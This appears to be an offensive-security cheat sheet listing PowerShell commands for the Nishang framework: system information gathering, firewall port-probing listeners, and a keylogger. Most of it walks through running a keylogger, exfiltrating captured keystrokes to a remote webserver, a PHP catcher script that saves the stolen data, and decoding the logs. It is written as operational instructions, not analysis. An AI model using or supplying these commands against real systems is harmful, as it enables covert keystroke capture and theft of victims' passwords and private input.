
*Get Information :*
`PS > cd \nishang-master\nishang-master\Gather
`PS > ipmo Get-Information.ps1;Get-Information

*Multiple Listener :*
`PS > cd \nishang-master\nishang-master\Gather
`PS > impo FireListener
`PS > FireListener -PortRange 400-450 -verbose
`PS > FireBuster -TargetIp x.x.x.x -PortRange 400-450

*Key Logger :*
`PS > .\nishang-master\nishang-master\Gather\Keylogger.ps1 -CheckURL http://x.x.x.x/check.txt -MagicString stop
read log:
`PS > cd \nishang-master\nishang-master\Utility
`PS > ipmo Invoke-Decode.ps1
`PS > ipmo parse_keys.ps1
`PS > Parse_keys -RawKeys .\check.txt -LoggedKeys logged.txt
`PS > cat logged.txt
`PS > get-job | stop-Job

exfil option:
`PS > .\nishang-master\nishang-master\Gather\Keylogger.ps1 -CheckURL http://x.x.x.x/check.txt -MagicString stop -exfil -ExfilOption Webserver -url http://x.x.x.x/catch.php
decode: 
`Kali@root~# cd /var/log/www
`Kali@root~# cat catch.php
`<?php file_put_contents('/var/www/data/check.txt',file_get_contents('php://input'));?>`
`Kali@root~# cat check.txt

`PS > cd \nishang-master\nishang-master\Utility
`PS > ipmo Invoke-Decode.ps1
`PS > ipmo parse_keys.ps1
`PS > Invoke-Decode -EncodedData "alkdjfla;hgdlsa;f\dlkaf;a\\\faldfl;a" -ISString
`PS > Parse_keys -RawKeys .\check.txt -LoggedKeys .\logged.txt
`PS > cat logged.txt